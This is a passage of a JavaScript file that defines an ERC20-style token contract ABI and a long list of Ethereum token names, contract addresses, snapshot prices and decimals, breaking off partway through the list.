const abiData = [{
    "inputs": [],
    "payable": false,
    "stateMutability": "nonpayable",
    "type": "constructor"
}, {
    "anonymous": false,
    "inputs": [{"indexed": true, "internalType": "address", "name": "owner", "type": "address"}, {
        "indexed": true,
        "internalType": "address",
        "name": "spender",
        "type": "address"
    }, {"indexed": false, "internalType": "uint256", "name": "value", "type": "uint256"}],
    "name": "Approval",
    "type": "event",
    "signature": "0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925"
}, {
    "anonymous": false,
    "inputs": [{
        "indexed": true,
        "internalType": "address",
        "name": "previousOwner",
        "type": "address"
    }, {"indexed": true, "internalType": "address", "name": "newOwner", "type": "address"}],
    "name": "OwnershipTransferred",
    "type": "event",
    "signature": "0x8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e0"
}, {
    "anonymous": false,
    "inputs": [{"indexed": true, "internalType": "address", "name": "from", "type": "address"}, {
        "indexed": true,
        "internalType": "address",
        "name": "to",
        "type": "address"
    }, {"indexed": false, "internalType": "uint256", "name": "value", "type": "uint256"}],
    "name": "Transfer",
    "type": "event",
    "signature": "0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef"
}, {
    "constant": true,
    "inputs": [],
    "name": "_decimals",
    "outputs": [{"internalType": "uint8", "name": "", "type": "uint8"}],
    "payable": false,
    "stateMutability": "view",
    "type": "function",
    "signature": "0x32424aa3"
}, {
    "constant": true,
    "inputs": [],
    "name": "_name",
    "outputs": [{"internalType": "string", "name": "", "type": "string"}],
    "payable": false,
    "stateMutability": "view",
    "type": "function",
    "signature": "0xd28d8852"
}, {
    "constant": true,
    "inputs": [],
    "name": "_symbol",
    "outputs": [{"internalType": "string", "name": "", "type": "string"}],
    "payable": false,
    "stateMutability": "view",
    "type": "function",
    "signature": "0xb09f1266"
}, {
    "constant": true,
    "inputs": [{"internalType": "address", "name": "owner", "type": "address"}, {
        "internalType": "address",
        "name": "spender",
        "type": "address"
    }],
    "name": "allowance",
    "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
    "payable": false,
    "stateMutability": "view",
    "type": "function",
    "signature": "0xdd62ed3e"
}, {
    "constant": false,
    "inputs": [{"internalType": "address", "name": "spender", "type": "address"}, {
        "internalType": "uint256",
        "name": "amount",
        "type": "uint256"
    }],
    "name": "approve",
    "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
    "payable": false,
    "stateMutability": "nonpayable",
    "type": "function",
    "signature": "0x095ea7b3"
}, {
    "constant": true,
    "inputs": [{"internalType": "address", "name": "account", "type": "address"}],
    "name": "balanceOf",
    "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
    "payable": false,
    "stateMutability": "view",
    "type": "function",
    "signature": "0x70a08231"
}, {
    "constant": false,
    "inputs": [{"internalType": "uint256", "name": "amount", "type": "uint256"}],
    "name": "burn",
    "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
    "payable": false,
    "stateMutability": "nonpayable",
    "type": "function",
    "signature": "0x42966c68"
}, {
    "constant": true,
    "inputs": [],
    "name": "decimals",
    "outputs": [{"internalType": "uint8", "name": "", "type": "uint8"}],
    "payable": false,
    "stateMutability": "view",
    "type": "function",
    "signature": "0x313ce567"
}, {
    "constant": false,
    "inputs": [{"internalType": "address", "name": "spender", "type": "address"}, {
        "internalType": "uint256",
        "name": "subtractedValue",
        "type": "uint256"
    }],
    "name": "decreaseAllowance",
    "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
    "payable": false,
    "stateMutability": "nonpayable",
    "type": "function",
    "signature": "0xa457c2d7"
}, {
    "constant": true,
    "inputs": [],
    "name": "getOwner",
    "outputs": [{"internalType": "address", "name": "", "type": "address"}],
    "payable": false,
    "stateMutability": "view",
    "type": "function",
    "signature": "0x893d20e8"
}, {
    "constant": false,
    "inputs": [{"internalType": "address", "name": "spender", "type": "address"}, {
        "internalType": "uint256",
        "name": "addedValue",
        "type": "uint256"
    }],
    "name": "increaseAllowance",
    "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
    "payable": false,
    "stateMutability": "nonpayable",
    "type": "function",
    "signature": "0x39509351"
}, {
    "constant": false,
    "inputs": [{"internalType": "uint256", "name": "amount", "type": "uint256"}],
    "name": "mint",
    "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
    "payable": false,
    "stateMutability": "nonpayable",
    "type": "function",
    "signature": "0xa0712d68"
}, {
    "constant": true,
    "inputs": [],
    "name": "name",
    "outputs": [{"internalType": "string", "name": "", "type": "string"}],
    "payable": false,
    "stateMutability": "view",
    "type": "function",
    "signature": "0x06fdde03"
}, {
    "constant": true,
    "inputs": [],
    "name": "owner",
    "outputs": [{"internalType": "address", "name": "", "type": "address"}],
    "payable": false,
    "stateMutability": "view",
    "type": "function",
    "signature": "0x8da5cb5b"
}, {
    "constant": false,
    "inputs": [],
    "name": "renounceOwnership",
    "outputs": [],
    "payable": false,
    "stateMutability": "nonpayable",
    "type": "function",
    "signature": "0x715018a6"
}, {
    "constant": true,
    "inputs": [],
    "name": "symbol",
    "outputs": [{"internalType": "string", "name": "", "type": "string"}],
    "payable": false,
    "stateMutability": "view",
    "type": "function",
    "signature": "0x95d89b41"
}, {
    "constant": true,
    "inputs": [],
    "name": "totalSupply",
    "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
    "payable": false,
    "stateMutability": "view",
    "type": "function",
    "signature": "0x18160ddd"
}, {
    "constant": false,
    "inputs": [{"internalType": "address", "name": "recipient", "type": "address"}, {
        "internalType": "uint256",
        "name": "amount",
        "type": "uint256"
    }],
    "name": "transfer",
    "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
    "payable": false,
    "stateMutability": "nonpayable",
    "type": "function",
    "signature": "0xa9059cbb"
}, {
    "constant": false,
    "inputs": [{"internalType": "address", "name": "sender", "type": "address"}, {
        "internalType": "address",
        "name": "recipient",
        "type": "address"
    }, {"internalType": "uint256", "name": "amount", "type": "uint256"}],
    "name": "transferFrom",
    "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
    "payable": false,
    "stateMutability": "nonpayable",
    "type": "function",
    "signature": "0x23b872dd"
}, {
    "constant": false,
    "inputs": [{"internalType": "address", "name": "newOwner", "type": "address"}],
    "name": "transferOwnership",
    "outputs": [],
    "payable": false,
    "stateMutability": "nonpayable",
    "type": "function",
    "signature": "0xf2fde38b"
}];

const currenciesEth = [{
    "name": "Tether USD (USDT)",
    "price": "1.001",
    "address": "0xdac17f958d2ee523a2206206994597c13d831ec7",
    "decimals": "6"
}, {
    "name": "Livepeer Token (LPT)",
    "price": "9.45",
    "address": "0x58b6a8a3302369daec383334672404ee733ab239",
    "decimals": "18"
}, {
    "name": "CarLive Chain (IOV)",
    "price": "0.00014794",
    "address": "0x0e69d0a2bbb30abcb7e5cfea0e4fde19c00a8d47",
    "decimals": "8"
}, {
    "name": "USD Coin (USDC)",
    "price": "0.998482",
    "address": "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48",
    "decimals": "6"
}, {
    "name": "SHIBA INU (SHIB)",
    "price": "0.00001127",
    "address": "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE",
    "decimals": "18"
}, {
    "name": "XENON (XNN)",
    "price": "0.00000195",
    "address": "0xab95e915c123fded5bdfb6325e35ef5515f1ea69",
    "decimals": "18"
}, {
    "name": "OMG Network (OMG)",
    "price": "1.71",
    "address": "0xd26114cd6EE289AccF82350c8d8487fedB8A0C07",
    "decimals": "18"
}, {
    "name": "ChainLink Token (LINK)",
    "price": "7.75",
    "address": "0x514910771af9ca656af840dff83e8264ecf986ca",
    "decimals": "18"
}, {
    "name": "Matic Token (MATIC)",
    "price": "0.84611042",
    "address": "0x7d1afa7b718fb893db30a3abc0cfc608aacfebb0",
    "decimals": "18"
}, {
    "name": "Dai Stablecoin (DAI)",
    "price": "1.00",
    "address": "0x6b175474e89094c44da98b954eedeac495271d0f",
    "decimals": "18"
}, {
    "name": "VIN (VIN)",
    "price": "0.00201673",
    "address": "0xf3e014fe81267870624132ef3a646b8e83853a96",
    "decimals": "18"
}, {
    "name": "BAT (BAT)",
    "price": "0.306051",
    "address": "0x0d8775f648430679a709e98d2b0cb6250d2887ef",
    "decimals": "18"
}, {
    "name": "Amber (AMB)",
    "price": "0.02244215",
    "address": "0x4dc3643dbc642b72c158e7f3d2ff232df61cb6ce",
    "decimals": "18"
}, {
    "name": "Uniswap (UNI)",
    "price": "6.91",
    "address": "0x1f9840a85d5af5bf1d1762f925bdaddc4201f984",
    "decimals": "18"
}, {
    "name": "BNB (BNB)",
    "price": "294.7866891",
    "address": "0x814F8ECe2321f977d26a481c7CD2eFb231dD4281",
    "decimals": "18"
}, {
    "name": "UCASH (UCASH)",
    "price": "0.00018819",
    "address": "0x92e52a1a235d9a103d970901066ce910aacefd37",
    "decimals": "8"
}, {
    "name": "HEX (HEX)",
    "price": "0.03338494",
    "address": "0x2b591e99afe9f32eaa6214f7b7629768c40eeb39",
    "decimals": "8"
}, {
    "name": "GSENetwork (GSE)",
    "price": "0.0000356",
    "address": "0xe530441f4f73bdb6dc2fa5af7c3fc5fd551ec838",
    "decimals": "4"
}, {
    "name": "Cronos Coin (CRO)",
    "price": "0.110523",
    "address": "0xa0b73e1ff0b80914ab6fe0444e65848c4c34450b",
    "decimals": "8"
}, {
    "name": "OCoin (OCN)",
    "price": "0.00008266",
    "address": "0x4092678e4e78230f46a1534c0fbc8fa39780892b",
    "decimals": "18"
}, {
    "name": "Compound USD Coin (cUSDC)",
    "price": "0.02266365",
    "address": "0x39aa39c021dfbae8fac545936693ac917d5e7563",
    "decimals": "8"
}, {
    "name": "Compound (COMP)",
    "price": "59.14",
    "address": "0xc00e94cb662c3520282e6f5717214004a7f26888",
    "decimals": "18"
}, {
    "name": "ZRX (ZRX)",
    "price": "0.26873",
    "address": "0xe41d2489571d322189246dafa5ebde1f4699f498",
    "decimals": "18"
}, {
    "name": "EnjinCoin (ENJ)",
    "price": "0.452199",
    "address": "0xf629cbd94d3791c9250152bd8dfbdf380e2a3b9c",
    "decimals": "18"
}, {
    "name": "Sai Stablecoin v1.0 (SAI)",
    "price": "7.06",
    "address": "0x89d24a6b4ccb1b6faa2625fe562bdd9a23260359",
    "decimals": "18"
}, {
    "name": "SAND (SAND)",
    "price": "0.850258",
    "address": "0x3845badAde8e6dFF049820680d1F14bD3903a5d0",
    "decimals": "18"
}, {
    "name": "Gala (GALA)",
    "price": "0.04127601",
    "address": "0x15D4c048F83bd7e37d49eA4C83a07267Ec4203dA",
    "decimals": "8"
}, {
    "name": "LoopringCoin V2 (LRC)",
    "price": "0.294628",
    "address": "0xbbbbca6a901c926f240b89eacb641d8aec7aeafd",
    "decimals": "18"
}, {
    "name": "chiliZ (CHZ)",
    "price": "0.217309",
    "address": "0x3506424f91fd33084466f402d5d97f05f8e3b4af",
    "decimals": "18"
}, {
    "name": "XMAX (XMX)",
    "price": "0.00002057",
    "address": "0x0f8c45b896784a1e408526b9300519ef8660209c",
    "decimals": "8"
}, {
    "name": "FTI (FTI)",
    "price": "0.00006179",
    "address": "0x943ed852dadb5c3938ecdc6883718df8142de4c8",
    "decimals": "18"
}, {
    "name": "Dogelon (ELON)",
    "price": "0.00000025",
    "address": "0x761d38e5ddf6ccf6cf7c55759d5210750b5d60f3",
    "decimals": "18"
}, {
    "name": "Binance USD (BUSD)",
    "price": "1.002",
    "address": "0x4fabb145d64652a948d72533023f6e7a623c7c53",
    "decimals": "18"
}, {
    "name": "EthLend (LEND)",
    "price": "1.60",
    "address": "0x80fB784B7eD66730e8b1DBd9820aFD29931aab03",
    "decimals": "18"
}, {
    "name": "HoloToken (HOT)",
    "price": "0.0020347",
    "address": "0x6c6ee5e31d828de241282b9606c8e98ea48526e2",
    "decimals": "18"
}, {
    "name": "ElectrifyAsia (ELEC)",
    "price": "0.00066156",
    "address": "0xd49ff13661451313ca1553fd6954bd1d9b6e02b9",
    "decimals": "18"
}, {
    "name": "IONChain Token (IONC)",
    "price": "0.00062731",
    "address": "0xbc647aad10114b89564c0a7aabe542bd0cf2c5af",
    "decimals": "18"
}, {
    "name": "Gifto (GTO)",
    "price": "0.01991103",
    "address": "0xc5bbae50781be1669306b9e001eff57a2957b09d",
    "decimals": "5"
}, {
    "name": "LiteXToken (LXT)",
    "price": "0.00028524",
    "address": "0xbc46d9961a3932f7d6b64abfdec80c1816c4b835",
    "decimals": "18"
}, {
    "name": "Graph Token (GRT)",
    "price": "0.101789",
    "address": "0xc944e90c64b2c07662a292be6244bdf05cda44a7",
    "decimals": "18"
}, {
    "name": "stETH (stETH)",
    "price": "1356.25",
    "address": "0xae7ab96520de3a18e5e111b5eaab095312d7fe84",
    "decimals": "18"
}, {
    "name": "Morpheus Infrastructure Token (MITx)",
    "price": "0.0043259",
    "address": "0x4a527d8fc13c5203ab24ba0944f4cb14658d1db6",
    "decimals": "18"
}, {
    "name": "Pax Dollar (USDP)",
    "price": "0.998407",
    "address": "0x8e870d67f660d95d5be530380d0ec0bd388289e1",
    "decimals": "18"
}, {
    "name": "ThingsOpreatingSystem (TOS)",
    "price": "0.00002248",
    "address": "0xfb5a551374b656c6e39787b1d3a03feab7f3a98e",
    "decimals": "18"
}, {
    "name": "Six Domain Asset (SDA)",
    "price": "0.00379023",
    "address": "0x4212fea9fec90236ecc51e41e2096b16ceb84555",
    "decimals": "18"
}, {
    "name": "Aurora (AOA)",
    "price": "0.00026339",
    "address": "0x9ab165d795019b6d8b3e971dda91071421305e5a",
    "decimals": "18"
}, {
    "name": "XCELTOKEN PLUS (XLAB)",
    "price": "0.00000495",
    "address": "0x8c4e7f814d40f8929f9112c5d09016f923d34472",
    "decimals": "18"
}, {
    "name": "SushiToken (SUSHI)",
    "price": "1.35",
    "address": "0x6b3595068778dd592e39a122f4f5a5cf09c90fe2",
    "decimals": "18"
}, {
    "name": "CNN Token (CNN)",
    "price": "0.00000302",
    "address": "0x8713d26637cf49e1b6b4a7ce57106aabc9325343",
    "decimals": "18"
}, {
    "name": "Polymath (POLY)",
    "price": "0.262677",
    "address": "0x9992ec3cf6a55b00978cddf2b27bc6882d88d1ec",
    "decimals": "18"
}, {
    "name": "1INCH Token (1INCH)",
    "price": "0.580155",
    "address": "0x111111111117dc0aa78b770fa6a738034120c302",
    "decimals": "18"
}, {
    "name": "Fantom Token (FTM)",
    "price": "0.224367",
    "address": "0x4e15361fd6b4bb609fa63c81a2be19d873717870",
    "decimals": "18"
}, {
    "name": "PCHAIN (PAI)",
    "price": "0.00440574",
    "address": "0xb9bb08ab7e9fa0a1356bd4a39ec0ca267e03b0b3",
    "decimals": "18"
}, {
    "name": "ApeCoin (APE)",
    "price": "5.19",
    "address": "0x4d224452801aced8b2f0aebe155379bb5d594381",
    "decimals": "18"
}, {
    "name": "Revain (REV)",
    "price": "0.0007935",
    "address": "0x2ef52Ed7De8c5ce03a4eF0efbe9B7450F2D7Edc9",
    "decimals": "6"
}, {
    "name": "Yee - A Blockchain-powered & Cloud-based Socia (YEE)",
    "price": "0.00009756",
    "address": "0x922105fad8153f516bcfb829f56dc097a0e1d705",
    "decimals": "18"
}, {
    "name": "Storj (STORJ)",
    "price": "0.452764",
    "address": "0xb64ef51c888972c908cfacf59b47c1afbc0ab8ac",
    "decimals": "8"
}, {
    "name": "Synthetix Network Token (SNX)",
    "price": "2.29",
    "address": "0xc011a73ee8576fb46f5e1c5751ca3b9fe0af2a6f",
    "decimals": "18"
}, {
    "name": "Maker (MKR)",
    "price": "850.17",
    "address": "0x9f8f72aa9304c8b593d555f12ef6589cc3a579a2",
    "decimals": "18"
}, {
    "name": "Fair Token (FAIR)",
    "price": "0.001061",
    "address": "0x9b20dabcec77f6289113e61893f7beefaeb1990a",
    "decimals": "18"
}, {
    "name": "FunFair (FUN)",
    "price": "0.00741701",
    "address": "0x419d0d8bdd9af5e606ae2232ed285aff190e711b",
    "decimals": "8"
}, {
    "name": "KyberNetwork (KNC)",
    "price": "1.14",
    "address": "0xdd974d5c2e2928dea5f71b9825b8b646686bd200",
    "decimals": "18"
}, {
    "name": "Amp (AMP)",
    "price": "0.0050618",
    "address": "0xff20817765cb7f73d4bde2e66e067e58d11095c2",
    "decimals": "18"
}, {
    "name": "Internet Node Token (INT)",
    "price": "0.00301052",
    "address": "0x0b76544f6c413a555f309bf76260d1e02377c02a",
    "decimals": "6"
}, {
    "name": "StatusNetwork (SNT)",
    "price": "0.0281497",
    "address": "0x744d70fdbe2ba4cf95131626614a1763df805b9e",
    "decimals": "18"
}, {
    "name": "Proton Token (PTT)",
    "price": "0.00001507",
    "address": "0x4689a4e169eb39cc9078c0940e21ff1aa8a39b9c",
    "decimals": "18"
}, {
    "name": "XY Oracle (XYO)",
    "price": "0.00653953",
    "address": "0x55296f69f40ea6d20e478533c15a6b08b654e758",
    "decimals": "18"
}, {
    "name": "DENT (DENT)",
    "price": "0.00094296",
    "address": "0x3597bfd533a99c9aa083587b074434e61eb0a258",
    "decimals": "8"
}, {
    "name": "BitDegree (BDG)",
    "price": "0.00026186",
    "address": "0x1961b3331969ed52770751fc718ef530838b6dee",
    "decimals": "18"
}, {
    "name": "Lympo tokens (LYM)",
    "price": "0.0027859",
    "address": "0xc690f7c7fcffa6a82b79fab7508c466fefdfc8c5",
    "decimals": "18"
}, {
    "name": "NucleusVision (nCash)",
    "price": "0.00005298",
    "address": "0x809826cceab68c387726af962713b64cb5cb3cca",
    "decimals": "18"
}, {
    "name": "NOAHCOIN (NOAH)",
    "price": "0.00000094",
    "address": "0x58a4884182d9e835597f405e5f258290e46ae7c2",
    "decimals": "18"
}, {
    "name": "Nexo (NEXO)",
    "price": "0.897962",
    "address": "0xb62132e35a6c13ee1ee0f84dc5d40bad8d815206",
    "decimals": "18"
}, {
    "name": "Compound Ether (cETH)",
    "price": "27.38",
    "address": "0x4ddc2d193948926d02f9b1fe9e1daa0718270ed5",
    "decimals": "8"
}, {
    "name": "Quant (QNT)",
    "price": "138.97",
    "address": "0x4a220e6096b25eadb88358cb44068a3248254675",
    "decimals": "18"
}, {
    "name": "智投链 (IIC)",
    "price": "0.00000191",
    "address": "0xb6f43025b29196af2dddd69b0a58afba079cd600",
    "decimals": "18"
}, {
    "name": "Salt (SALT)",
    "price": "0.04448935",
    "address": "0x4156D3342D5c385a87D264F90653733592000581",
    "decimals": "8"
}, {
    "name": "hoge.finance (HOGE)",
    "price": "0.00003099",
    "address": "0xfad45e47083e4607302aa43c65fb3106f1cd7607",
    "decimals": "9"
}, {
    "name": "HeroNodeToken (HER)",
    "price": "0.00017407",
    "address": "0x491c9a23db85623eed455a8efdd6aba9b911c5df",
    "decimals": "18"
}, {
    "name": "Social Activity Token (SAT)",
    "price": "0.0000289",
    "address": "0xc56b13ebbcffa67cfb7979b900b736b3fb480d78",
    "decimals": "8"
}, {
    "name": "RED MWAT (MWAT)",
    "price": "0.00788625",
    "address": "0x6425c6be902d692ae2db752b3c268afadb099d3b",
    "decimals": "18"
}, {
    "name": "Hms Token (HMC)",
    "price": "0.0007582",
    "address": "0xAa0bb10CEc1fa372eb3Abc17C933FC6ba863DD9E",
    "decimals": "18"
}, {
    "name": "Refereum (RFR)",
    "price": "0.00618082",
    "address": "0xd0929d411954c47438dc1d871dd6081f5c5e149c",
    "decimals": "4"
}, {
    "name": "CanYaCoin (CAN)",
    "price": "0.00932818",
    "address": "0x1d462414fe14cf489c7a21cac78509f4bf8cd7c0",
    "decimals": "6"
}, {
    "name": "CoinFi (COFI)",
    "price": "0.00144006",
    "address": "0x3136ef851592acf49ca4c825131e364170fa32b3",
    "decimals": "18"
}, {
    "name": "Indorse (IND)",
    "price": "0.00337491",
    "address": "0xf8e386eda857484f5a12e4b5daa9984e06e73705",
    "decimals": "18"
}, {
    "name": "Fuel Token (FUEL)",
    "price": "0.00029038",
    "address": "0xea38eaa3c86c8f9b751533ba2e562deb9acded40",
    "decimals": "18"
}, {
    "name": "I HOUSE TOKEN (IHT)",
    "price": "0.00020854",
    "address": "0xeda8b016efa8b1161208cf041cd86972eee0f31e",
    "decimals": "18"
}, {
    "name": "FLOKI (FLOKI)",
    "price": "0.00000792",
    "address": "0xcf0c122c6b73ff809c693db761e7baebe62b6a2e",
    "decimals": "9"
}, {
    "name": "MoneyToken (IMT)",
    "price": "0.00004095",
    "address": "0x13119e34e140097a507b07a5564bde1bc375d9e6",
    "decimals": "18"
}, {
    "name": "ZeusShieldCoin (ZSC)",
    "price": "0.00010944",
    "address": "0x7A41e0517a5ecA4FdbC7FbebA4D4c47B9fF6DC63",
    "decimals": "18"
}, {
    "name": "Ethereum Name Service (ENS)",
    "price": "17.42364602",
    "address": "0xc18360217d8f7ab5e7c516566761ea12ce7f9d72",
    "decimals": "18"
}, {
    "name": "DATx (DATx)",
    "price": "0.00000561",
    "address": "0xabbbb6447b68ffd6141da77c18c7b5876ed6c5ab",
    "decimals": "18"
}, {
    "name": "Dentacoin (Dentacoin)",
    "price": "0.00000157",
    "address": "0x08d32b0da63e2C3bcF8019c9c5d849d7a9d791e6",
    "decimals": "0"
}, {
    "name": "Storiqa (STQ)",
    "price": "0.0000031",
    "address": "0x5c3a228510d246b78a3765c20221cbf3082b44a4",
    "decimals": "18"
}, {
    "name": "TenXPay (PAY)",
    "price": "0.01632804",
    "address": "0xB97048628DB6B661D4C2aA833e95Dbe1A905B280",
    "decimals": "18"
}, {
    "name": "OneRoot Network (RNT)",
    "price": "0.00160686",
    "address": "0xff603f43946a3a28df5e6a73172555d8c8b02386",
    "decimals": "18"
}, {
    "name": "KAN (KAN)",
    "price": "0.00117212",
    "address": "0x1410434b0346f5be678d0fb554e5c7ab620f8f4a",
    "decimals": "18"
}, {
    "name": "Smooth Love Potion (SLP)",
    "price": "0.00350823",
    "address": "0xcc8fa225d80b9c7d42f96e9570156c65d6caaa25",
    "decimals": "0"
}, {
    "name": "PowerLedger (POWR)",
    "price": "0.196604",
    "address": "0x595832f8fc6bf59c85c527fec3740a1b7a361269",
    "decimals": "6"
}, {
    "name": "RUFF (RUFF)",
    "price": "0.00038562",
    "address": "0xf278c1ca969095ffddded020290cf8b5c424ace2",
    "decimals": "18"
}, {
    "name": "WePower (WPR)",
    "price": "0.00073006",
    "address": "0x4CF488387F035FF08c371515562CBa712f9015d4",
    "decimals": "18"
}, {
    "name": "TrueUSD (TUSD)",
    "price": "1.00",
    "address": "0x0000000000085d4780B73119b644AE5ecd22b376",
    "decimals": "18"
}, {
    "name": "ELF (ELF)",
    "price": "0.132005",
    "address": "0xbf2179859fc6d5bee9bf9158632dc51678a4100e",
    "decimals": "18"
}, {
    "name": "FOTA (FOTA)",
    "price": "0.00021695",
    "address": "0x4270bb238f6dd8b1c3ca01f96ca65b2647c06d3c",
    "decimals": "18"
}, {
    "name": "yearn.finance (YFI)",
    "price": "8262.28",
    "address": "0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e",
    "decimals": "18"
}, {
    "name": "HuobiToken (HT)",
    "price": "4.18",
    "address": "0x6f259637dcd74c767781e37bc6133cd6a68aa161",
    "decimals": "18"
}, {
    "name": "OKB (OKB)",
    "price": "15.66",
    "address": "0x75231f58b43240c9718dd58b4967c5114342a86c",
    "decimals": "18"
}, {
    "name": "Bytom (BTM)",
    "price": "0.00910718",
    "address": "0xcb97e65f07da24d46bcdd078ebebd7c6e6e3d750",
    "decimals": "8"
}, {
    "name": "Kin (KIN)",
    "price": "0.00001164",
    "address": "0x818fc6c2ec5986bc6e2cbf00939d90556ab12ce5",
    "decimals": "18"
}, {
    "name": "LON Token (LON)",
    "price": "0.605814",
    "address": "0x0000000000095413afc295d19edeb1ad7b71c952",
    "decimals": "18"
}, {
    "name": "NAGA Coin (NGC)",
    "price": "0.04348138",
    "address": "0x72dd4b6bd852a3aa172be4d6c5a6dbec588cf131",
    "decimals": "18"
}, {
    "name": "Atomic Wallet Token (AWC)",
    "price": "0.39452994",
    "address": "0xad22f63404f7305e4713ccbd4f296f34770513f4",
    "decimals": "8"
}, {
    "name": "Free Coin (FREE)",
    "price": "0.00000027",
    "address": "0x2f141ce366a2462f02cea3d12cf93e4dca49e4fd",
    "decimals": "18"
}, {
    "name": "StormX (STMX)",
    "price": "0.00724484",
    "address": "0xbe9375c6a420d2eeb258962efb95551a5b722803",
    "decimals": "18"
}, {
    "name": "VeChain (VEN)",
    "price": "0.02367015",
    "address": "0xd850942ef8811f2a866692a623011bde52a462c1",
    "decimals": "18"
}, {
    "name": "BHPCash (BHPC)",
    "price": "0.17722121",
    "address": "0xee74110fb5a1007b06282e0de5d73a61bf41d9cd",
    "decimals": "18"
}, {
    "name": "Gas DAO (GAS)",
    "price": "0.00000198",
    "address": "0x6bba316c48b49bd1eac44573c5c871ff02958469",
    "decimals": "18"
}, {
    "name": "Friendz Coin (FDZ)",
    "price": "0.00039705",
    "address": "0x23352036e911a22cfc692b5e2e196692658aded9",
    "decimals": "18"
}, {
    "name": "ZTCoin (ZT)",
    "price": "0.00468096",
    "address": "0xfe39e6a32acd2af7955cb3d406ba2b55c901f247",
    "decimals": "18"
}, {
    "name": "Balancer (BAL)",
    "price": "5.19",
    "address": "0xba100000625a3754423978a60c9317c58a424e3d",
    "decimals": "18"
}, {
    "name": "Aurora DAO (AURA)",
    "price": "0.061579",
    "address": "0xcdcfc0f66c522fd086a1b725ea3c0eeb9f9e8814",
    "decimals": "18"
}, {
    "name": "OriginToken (OGN)",
    "price": "0.150594",
    "address": "0x8207c1ffc5b6804f6024322ccf34f29c3541ae26",
    "decimals": "18"
}, {
    "name": "Telcoin (TEL)",
    "price": "0.0013069",
    "address": "0x467Bccd9d29f223BcE8043b84E8C8B282827790F",
    "decimals": "2"
}, {
    "name": "Request (REQ)",
    "price": "0.105018",
    "address": "0x8f8221afbb33998d8584a2b05749ba73c37a938a",
    "decimals": "18"
}, {
    "name": "IOSToken (IOST)",
    "price": "0.01184812",
    "address": "0xfa1a856cfa3409cfa145fa4e20eb270df3eb21ab",
    "decimals": "18"
}, {
    "name": "Orchid (OXT)",
    "price": "0.09834",
    "address": "0x4575f41308EC1483f3d399aa9a2826d74Da13Deb",
    "decimals": "18"
}, {
    "name": "Genaro X (GNX)",
    "price": "0.00293672",
    "address": "0x6ec8a24cabdc339a06a172f8223ea557055adaa5",
    "decimals": "9"
}, {
    "name": "UseChain Token (USE)",
    "price": "0.00015281",
    "address": "0xd9485499499d66b175cf5ed54c0a19f1a6bcb61a",
    "decimals": "18"
}, {
    "name": "WaykiCoin (WIC)",
    "price": "0.07222865",
    "address": "0x4f878c0852722b0976a955d68b376e4cd4ae99e5",
    "decimals": "8"
}, {
    "name": "Dragon (DRGN)",
    "price": "0.01830688",
    "address": "0x419c4db4b9e25d6db2ad9691ccb832c8d9fda05e",
    "decimals": "18"
}, {
    "name": "Bancor (BNT)",
    "price": "0.441749",
    "address": "0x1f573d6fb3f13d689ff844b4ce37794d79a7ff1c",
    "decimals": "18"
}, {
    "name": "smartshare token (SSP)",
    "price": "0.00001599",
    "address": "0x624d520bab2e4ad83935fa503fb130614374e850",
    "decimals": "4"
}, {
    "name": "MT Token (MT)",
    "price": "0.00010698",
    "address": "0x9b4e2b4b13d125238aa0480dd42b4f6fc71b37cc",
    "decimals": "18"
}, {
    "name": "FOX (FOX)",
    "price": "0.04520672",
    "address": "0xc770eefad204b5180df6a14ee197d99d808ee52d",
    "decimals": "18"
}, {
    "name": "Hurify Token (HUR)",
    "price": "0.00005267",
    "address": "0xcdb7ecfd3403eef3882c65b761ef9b5054890a47",
    "decimals": "18"
}, {
    "name": "Substratum (SUB)",
    "price": "0.0008517",
    "address": "0x8d75959f1e61ec2571aa72798237101f084de63a",
    "decimals": "18"
}, {
    "name": "Ocean Token (OCEAN)",
    "price": "0.156405",
    "address": "0x967da4048cD07aB37855c090aAF366e4ce1b9F48",
    "decimals": "18"
}, {
    "name": "Quantstamp (QSP)",
    "price": "0.01498714",
    "address": "0x99ea4db9ee77acd40b119bd1dc4e33e1c070b80d",
    "decimals": "18"
}, {
    "name": "BitCapitalVendorToken (BCV)",
    "price": "0.00010348",
    "address": "0x1014613e2b3cbc4d575054d4982e580d9b99d7b1",
    "decimals": "8"
}, {
    "name": "LockTrip (LOC)",
    "price": "0.792982",
    "address": "0x5e3346444010135322268a4630d2ed5f8d09446c",
    "decimals": "18"
}, {
    "name": "Numeraire (NMR)",
    "price": "16.52",
    "address": "0x1776e1f26f98b1a5df9cd347953a26dd3cb46671",
    "decimals": "18"
}, {
    "name": "ZEON (ZEON)",
    "price": "0.00566842",
    "address": "0xe5b826ca2ca02f09c1725e9bd98d9a8874c30532",
    "decimals": "18"
}, {
    "name": "BCDN (BCDN)",
    "price": "0.00038359",
    "address": "0x1e797Ce986C3CFF4472F7D38d5C4aba55DfEFE40",
    "decimals": "15"
}, {
    "name": "LibraToken (LBA)",
    "price": "0.00124232",
    "address": "0xfe5f141bf94fe84bc28ded0ab966c16b17490657",
    "decimals": "18"
}, {
    "name": "Celsius (CEL)",
    "price": "1.15",
    "address": "0xaaaebe6fe48e54f431b0c390cfaf0b017d09d42d",
    "decimals": "4"
}, {
    "name": "Covalent Token (COVA)",
    "price": "0.00003107",
    "address": "0xb37a769b37224449d92aac57de379e1267cd3b00",
    "decimals": "18"
}, {
    "name": "KanadeCoin (KNDC)",
    "price": "0.00001364",
    "address": "0x8e5610ab5e39d26828167640ea29823fe1dd5843",
    "decimals": "8"
}, {
    "name": "SingularityNET Token (AGIX)",
    "price": "0.04737899",
    "address": "0x5b7533812759b45c2b44c19e320ba2cd2681b542",
    "decimals": "8"
}, {
    "name": "BandToken (BAND)",
    "price": "1.24",
